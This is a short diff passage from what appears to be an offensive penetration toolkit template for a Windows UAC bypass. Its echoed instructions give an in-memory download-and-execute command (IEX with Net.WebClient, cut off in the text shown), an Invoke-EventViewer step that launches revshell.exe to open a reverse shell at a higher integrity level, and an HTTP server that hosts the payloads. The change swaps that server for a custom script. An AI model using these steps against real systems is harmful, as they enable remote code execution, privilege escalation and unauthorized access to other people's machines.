@@ -6,4 +6,4 @@ echo 'Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).Download
 echo 'Execute (It takes a few seconds to trigger the revshell): Invoke-EventViewer <%=$(esh variables/delivery_path_windows)%>\revshell.exe'; \
 echo 'NOTE: You should get a new revshell with a higher integrity level (but still the same user)'; \
 echo '================================================================'; \
-python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
